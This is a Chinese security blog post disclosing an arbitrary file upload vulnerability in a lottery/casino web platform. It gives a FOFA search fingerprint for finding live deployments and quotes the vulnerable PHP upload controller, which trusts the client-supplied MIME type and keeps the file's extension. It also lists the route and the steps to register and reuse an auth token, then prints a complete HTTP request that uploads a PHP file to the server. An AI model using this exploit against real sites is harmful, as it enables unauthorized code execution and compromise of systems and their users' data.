#  某火cai票娱乐城系统存在前台任意文件上传漏洞  
 C4安全   2026-03-23 01:31  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0 "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**最近很火的烽火娱乐/cai票娱乐城/全开源vue版本/带文本搭建教程，带有优惠，聊天室，充值提现都是U进行的，都是cai票之类的.**  
  
**Fofa指纹:"/action-sheet-fix.css"**  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSqebsJbN49CXRtd4xBrWyN9DgSDyasSjpdbpf3so9FSD1SYORxF6K1IVwTuiaItfSibvTnOBQKpibOvbWX5Unk6ZRujRvdj7K2pjM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSpSO1YxZrCnqWAh4W8nz2mmB3iba8KQCg5NJ3LktBdk5Lg7BWoibQ2iamApIhrKx6gWNTy6pQ0a8AEBIHCLEqKfdHZ9dqFDk03EYo/640?wx_fmt=png&from=appmsg "")  
  
**框架:Leavel**  
## 0x01 漏洞研究&复现  
  
**位于 /api/app/controller/api/WithdrawController.php 控制器的uploadQrCode 方法通过 $file->move() 上传文件，且过滤不严格，导致任意文件上传漏洞产生.**  
```
public function uploadQrCode(Request $request)
  {
    $userId = $request->userId ?? 0;

    if (!$userId) {
      return json(['code' => 401, 'message' => '请先登录', 'data' => null]);
    }

    try {
      $file = $request->file('file');
      if (!$file || !$file->isValid()) {
        return json(['code' => 400, 'message' => '请选择要上传的图片', 'data' => null]);
      }


      $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
      $uploadMimeType = $file->getUploadMimeType();
      if (!in_array($uploadMimeType, $allowedTypes)) {
        return json(['code' => 400, 'message' => '只支持 JPG、PNG、GIF、WEBP 格式图片', 'data' => null]);
      }


      if ($file->getSize() > 5 * 1024 * 1024) {
        return json(['code' => 400, 'message' => '图片大小不能超过5MB', 'data' => null]);
      }


      $ext = $file->getUploadExtension() ?: 'jpg';
      $filename = 'qrcode/' . date('Ymd') . '/' . uniqid() . '_' . $userId . '.' . $ext;


      $dir = public_path() . '/uploads/qrcode/' . date('Ymd');
      if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
      }


      $savePath = public_path() . '/uploads/' . $filename;
      $file->move($savePath);


      $host = $request->host();
      $scheme = $request->header('X-Forwarded-Proto') ?: ($request->header('scheme') ?: 'http');
      $url = $scheme . '://' . $host . '/uploads/' . $filename;

      return json([
                  'code' => 0,
                  'message' => '上传成功',
                  'data' => [
                  'url' => $url
                  ]
                  ]);

    } catch (\Exception $e) {
      \support\Log::error('上传收款码失败: ' . $e->getMessage());
      return json(['code' => 500, 'message' => '上传失败: ' . $e->getMessage(), 'data' => null]);
    }
  }

```  
  
**然后我们去查看 /api/config/route.php 路由文件，查找 uploadQrCode 方法对应的路由**  
```
Route::group('/api/v1', function () {
      Route::post('/withdraw/upload-qrcode', [app\controller\api\WithdrawController::class, 'uploadQrCode']);
})->middleware([
    app\middleware\AuthMiddleware::class,
]);
```  
  
**发现实际请求路径为 /api/v1/withdraw/upload-qrcode 这样我们就得到了正确的请求路径，然后我们需要先去主页注册一个账号，这套系统邀请码是选填的，所以可以随便注册**  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSo5plxrUuyYRaQiaBkKaj5rAAnYibUrBXnFt1pydNo9wnUywZLxgKpPgPo0XcaGHHPO78F1iaCG327mCKUUjs3GONLpqbOCxleTWA/640?wx_fmt=png&from=appmsg "")  
  
**然后F12 随便找一处请求，拿到 authorization，之后替换Authorization直接请求即可**  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSq64WGsDnm2ibZuHMMy9fdvnwa6TITsgh5tzSQFF8FlVEs7ApAeU3snty9kmavjAgdIuLY0ib0EkX5KOicqZrZrx21icc6rr3ibajrM/640?wx_fmt=png&from=appmsg "")  
  
**Payload:**  
```
POST /api/v1/withdraw/upload-qrcode HTTP/2
Host: 127.0.0.1
Cookie: server_name_session=66d9ce13c9eaad4828c06dfa366aaa2f
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT2GEWpMD4SoAY0IG
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Authorization: 你的token

------WebKitFormBoundaryT2GEWpMD4SoAY0IG
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundaryT2GEWpMD4SoAY0IG--
```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSrto5MwibOb86MRZcjDgu5ISH0IwJvjqmSgjIPDUoZehnDzicMvicqH1PkUuyLhqn2KKibXGYM0gA2EiayKFmtnDNd8mibof225iabPYQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSq1DPFSiaSibNtXpBLMfNqGnGw5vN2mzNNIclRN9zZV1J5dxrysPHdiaxmZ25EKQcCE2JuHoDYId2184MZibNGl8qwV90DM61ruYWc/640?wx_fmt=png&from=appmsg "")  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
  
感兴趣的师傅可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**安全渗透感知大家族**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9COP0dhPpvfwgOcsxvlLjHJ2FX0P9eib559uqEBMoejSqLYg9HUflsBfXibwMCJU9wjhp9qqSIgsAXqWErLc2FtK6nPsO7rqb9yjk/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
  
****  
（新人优惠券折扣  
20.0  
￥，扫码即可领取更多优惠）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9CM2vbibDnRe26wJCaYibFGWUYkXTbVCDmBqx2Jh0uZ4Fanwcbpib5OdMG8q7Ie0nD0XDibqDhBUyibdsLx4L1e4ObtRkSZqVPfk0Giag/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=14 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/niasx7fyic9COCkUfSeoNxUnEOKvzLL2yNgR3GuDASvdBuDuCBuHGibv8c6cmn5eBe4g5wCoK2I67arXsyPDMjluHp7y9SbAmhfvjoqqVoDTZY/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=15 "")  
  
****  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可**  
  
****  
END  
  
  
  
